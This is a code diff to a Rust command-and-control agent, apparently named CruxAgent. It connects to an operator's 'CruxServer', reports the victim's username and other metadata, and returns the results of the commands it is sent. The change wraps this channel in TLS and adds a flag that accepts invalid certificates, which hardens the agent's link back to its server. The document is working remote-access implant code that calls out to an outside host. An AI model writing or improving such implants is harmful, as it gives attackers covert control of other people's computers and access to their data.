@@ -3,6 +3,7 @@ mod args;
 mod utils;
 
 // crates
+use native_tls::{TlsConnector, TlsStream};
 use clap::error::Result;
 use clap::{Parser};
 use whoami::{self, fallible};
@@ -12,7 +13,7 @@ use regex::Regex;
 
 // std
 use std::env;
-use std::net::{TcpStream, Shutdown};
+use std::net::{TcpStream};
 use std::collections::HashMap;
 
 // My stuff
@@ -22,7 +23,7 @@ use utils::network::write_length_prefix;
 use utils::data::{CmdType, Cmd, CmdResult};
 use crate::utils::network::read_length_prefix;
 
-fn send_metadata(stream :&mut TcpStream) -> Result<(), Box<dyn std::error::Error>>{
+fn send_metadata(stream :&mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
     // Prepare Metadata
     let metadata = Metadata {
         username: whoami::username(),
@@ -36,7 +37,7 @@ fn send_metadata(stream :&mut TcpStream) -> Result<(), Box<dyn std::error::Error
     Ok(())
 }
 
-fn send_response(cmd_result: &CmdResult, stream: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>>{
+fn send_response(cmd_result: &CmdResult, stream: &mut TlsStream<TcpStream>) -> Result<(), Box<dyn std::error::Error>>{
     // Serialize CmdResult
     let result_str = serde_json::to_string(cmd_result)?;
     write_length_prefix(stream, result_str.as_bytes())?;
@@ -97,10 +98,16 @@ fn variable_substitution(command: &str, var_map: &HashMap<String, String>) -> St
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = CruxAgentArgs::parse();
-    println!("connecting to {} on port {}", args.rhost, args.rport);
+    // println!("Connected to {} on port {}", args.rhost, args.rport);
+
+    // Connect to CruxServer via TLS
+    let connector = TlsConnector::builder()
+        .danger_accept_invalid_certs(!args.verify_cert)
+        .build().unwrap(); // TODO: Find a better way to handle this error
 
     let ip_str = format!("{}:{}", args.rhost, args.rport);
-    let mut stream = TcpStream::connect(ip_str)?;
+    let stream = TcpStream::connect(ip_str)?;
+    let mut stream = connector.connect(&args.rhost.to_string(), stream)?;
 
     send_metadata(&mut stream)?;
 
@@ -111,7 +118,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     // Hash map for shell variables
-    // Look out for concurrency safety potentially
+    // Look out for concurrency safety issues potentially
     let mut shell_var_map: HashMap<String, String> = HashMap::new();
 
     loop {
@@ -196,6 +203,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             break;
         }
     }
-    stream.shutdown(Shutdown::Both)?;
+    stream.shutdown()?;
     Ok(())
 }
